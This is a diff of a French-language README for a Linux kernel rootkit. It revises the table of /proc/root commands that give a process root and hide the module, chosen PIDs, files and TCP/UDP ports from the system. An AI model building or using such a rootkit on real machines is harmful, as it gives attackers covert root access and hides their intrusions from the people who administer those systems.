@@ -233,13 +233,14 @@ rmmod rootkit
 
 ## Commandes /proc/root
 
-| Commande           | Effet                            |
-|--------------------|----------------------------------|
-| `0`                | root sur le processus courant    |
-| `<pid>`            | root sur le pid donné            |
-| `hide`             | cache le module                  |
-| `show`             | rend le module visible           |
-| `hideproc:<pid>`   | cache le pid dans /proc          |
-| `hidefile:<name>`  | cache un fichier par nom         |
-| `clearfile`        | efface le fichier caché          |
-| `hideport:<port>`  | cache un port dans /proc/net/tcp |
+| Commande           | Effet                                         |
+|--------------------|-----------------------------------------------|
+| `root`             | root sur le processus courant                 |
+| `hide`             | cache le module (lsmod + /sys/module/)        |
+| `show`             | rend le module visible                        |
+| `hideproc:<pid>`   | ajoute un pid à cacher dans /proc (max 16)    |
+| `clearprocs`       | vide la liste des pids cachés                 |
+| `hidefile:<name>`  | ajoute un fichier à cacher par nom (max 16)   |
+| `clearfiles`       | vide la liste des fichiers cachés             |
+| `hideport:<port>`  | ajoute un port TCP+UDP à cacher (max 16)      |
+| `clearports`       | vide la liste des ports cachés                |
